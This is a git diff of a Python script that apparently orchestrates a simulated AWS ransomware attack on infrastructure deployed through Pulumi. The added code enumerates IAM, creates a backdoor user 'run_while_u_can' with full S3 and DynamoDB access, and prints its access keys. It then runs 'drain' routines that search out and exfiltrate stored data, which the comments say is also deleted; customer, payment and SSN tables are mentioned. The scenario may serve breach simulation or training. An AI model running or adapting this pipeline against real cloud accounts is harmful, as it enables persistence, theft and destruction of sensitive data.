@@ -1,6 +1,7 @@
 import os
 import subprocess
 import json
+import time
 from tqdm import tqdm
 from time import sleep
 from termcolor import colored
@@ -8,9 +9,12 @@ import Functions
 from Helpers import loading_animation
 import pyqrcode
 from clean_up import full_cleanup
+import pulumi
+import pulumi_aws as aws
 import boto3
 from attack import Attack
 from MFA import MFASetup
+from ransomware import Ransomware
 
 
 # Initialize AWS Clients
@@ -25,6 +29,15 @@ mfa_arn = ""
 
 # Create MFASetup instance with required parameters
 mfa = MFASetup(user, mfa_arn, iam_client, sts_client, PULUMI_OUTPUT_PATH)
+
+# # Load Pulumi Stack Outputs
+# stack_outputs = pulumi.StackReference("dev")
+
+# config_bucket_id = stack_outputs.get_output("config_files_bucket")
+# customer_bucket_id = stack_outputs.get_output("customer_data_bucket")
+# payment_bucket_id = stack_outputs.get_output("payment_data_bucket")
+# orders_table_name = stack_outputs.get_output("CustomerOrdersTable")
+# ssn_table_name = stack_outputs.get_output("CustomerSSNTable")
 
 
 def forrester_scenario_execute():
@@ -150,29 +163,29 @@ def ensure_pulumi_deployment():
 
 
 if __name__ == "__main__":
-    print("Starting Infrastructure Deployment...")
+    # print("Starting Infrastructure Deployment...")
 
 
-    print("\n\n\n") 
-    print("Executing Pulumi Deployment...")
-    print("\n\n\n")
-    forrester_scenario_execute()
+    # print("\n\n\n") 
+    # print("Executing Pulumi Deployment...")
+    # print("\n\n\n")
+    # forrester_scenario_execute()
 
-    print("\n\n\n") 
-    print("Validating Rollout...")
-    print("\n\n\n")
-    forrester_scenario_validate_rollout()
+    # print("\n\n\n") 
+    # print("Validating Rollout...")
+    # print("\n\n\n")
+    # forrester_scenario_validate_rollout()
 
-    print("\n\n\n") 
-    print("Validating Data Population Within Infrastructure for EC2 & DynamoDB")
-    print("\n\n\n")
-    forrester_scenario_validate_data()
+    # print("\n\n\n") 
+    # print("Validating Data Population Within Infrastructure for EC2 & DynamoDB")
+    # print("\n\n\n")
+    # forrester_scenario_validate_data()
 
 
-    print("\n\n\n") 
-    print("Setting up MFA for DevOpsUser and getting a session token")
-    print("\n\n\n")
-    mfa.setup_mfa_and_login()
+    # print("\n\n\n") 
+    # print("Setting up MFA for DevOpsUser and getting a session token")
+    # print("\n\n\n")
+    # mfa.setup_mfa_and_login()
 
 
     print("\n\n\n") 
@@ -182,66 +195,90 @@ if __name__ == "__main__":
     attack.enumeration.run_all_enumerations()
     
 
-
-
-    # #  
-    # #################################
-    # ### Boto3 Session with DevopsUser
-    # #################################
-    # print("\n\n\n") 
-    # print(f"Initializing boto3 session with: {user}")
-    # print("\n\n\n") 
-    # user_session = boto3.Session(
-    #     aws_access_key_id=mfa.accesskey_ID,
-    #     aws_secret_access_key=mfa.secret_access_key,
-    #     aws_session_token=mfa.session_token,
-    #     region_name="us-east-1"
-    # )
-
+    print("\n\n\n")
+    print("\n DevopsUser creating new user: `run_while_u_can` and obtaining new credentials...")
+    print("\n\n\n")
     #####################################################
     ### DevopsUser creating Ransomware user, access keys
     ### &  attaching AWS s3/Dynamodb all access policies
     #####################################################
-    attack.createuser_attatchpolicies.run_pipeline(
-        username="run_while_u_can", 
+    user_name = "run_while_u_can"
+    ransomware_access_keys = attack.createuser_attatchpolicies.run_pipeline(
+        username=user_name,
         policy_arns=[
             "arn:aws:iam::aws:policy/AmazonDynamoDBFullAccess",
             "arn:aws:iam::aws:policy/AmazonS3FullAccess"
         ]
-)
+    )
+
+    
+
+    access_key, secret_key = ransomware_access_keys[0][0], ransomware_access_keys[1][0]
+    print(f"{user_name} Access Key: {access_key}")
+    print(f"{user_name} Secret Key: {secret_key}")
+
+    ransomware = Ransomware(access_key,secret_key)
+
+    ransomware.session_test()
 
 
+    ransomware.s3_drain.search_and_exfiltrate()
 
-    ########################################
-    ### Boto3 Session with run_while_you_can
-    ########################################
-
-
-
-
-
-
-    # 🚀 Proceed with Attack Scenario
-    # print("\n🔥 MFA Phishing Simulated Successfully! Proceeding with Attack...")
-    # Here, you will continue the attack scenario.
-
-
-
-
+    ransomware.dynamodb_drain.search_and_exfiltrate()
 
 
 
 
 
-# def devops_user_MFA_Setup():
-#     """🔐 Execute MFA Setup Step-by-Step"""
+ 
 
-#     print("\n🚀 Initiating MFA Setup...")
 
-#     attack.mfa.cleanup_old_mfa()  # ✅ Delete any stale MFA devices
-#     attack.mfa.create_mfa_device()  # ✅ Create new virtual MFA device
-#     attack.mfa.extract_mfa_secret()  # ✅ Extract the MFA seed
-#     code1, code2 = attack.mfa.generate_mfa_codes()  # ✅ Generate TOTP MFA codes
-#     attack.mfa.enable_mfa(code1, code2)  # ✅ Enable MFA on AWS IAM user
-#     print("\n MFA Setup for DevopsUser Successfully Completed!")
+
+
+    # if ransomware_session:
+    #     print("\nNew user `run_while_u_can` is ready. Initiating attack phase...")
+
+    #     # Validating run_while_you_can session identity
+    #     # try:
+    #     #    sts_client = ransomware_session.client("sts")
+    #     #    identity = sts_client.get_caller_identity()
+    #     #    print(f"🔍 Confirmed AWS Identity: {identity['Arn']}")
+    #     # except Exception as e:
+    #     #    print(f"❌ ERROR: Invalid session credentials: {e}")
+    #     #    exit(1)
+
+    #     # Initiate S3 Draining using ransomware session
+    #     s3_attacker = attack.S3_Drain_Delete(ransomware_session)
+    #     s3_attacker.search_and_exfiltrate()
+
+    #     # Initiate DynamoDB Draining using ransomware session
+    #     dynamo_attacker = attack.DynamoDB_Drain_Delete(ransomware_session)
+    #     dynamo_attacker.search_and_exfiltrate()
+
+    #     print("\nAttack Complete! All data has been exfiltrated and deleted.")
+    # else:
+    #     print("Failed to create new boto session off of run_while_u_can.")
+
+
+
+
+
+
+
+
+
+
+
+#     #####################################################
+#     ### DevopsUser creating Ransomware user, access keys
+#     ### &  attaching AWS s3/Dynamodb all access policies
+#     #####################################################
+#     attack.createuser_attatchpolicies.run_pipeline(
+#         username="run_while_u_can", 
+#         policy_arns=[
+#             "arn:aws:iam::aws:policy/AmazonDynamoDBFullAccess",
+#             "arn:aws:iam::aws:policy/AmazonS3FullAccess"
+#         ]
+# )
+
 
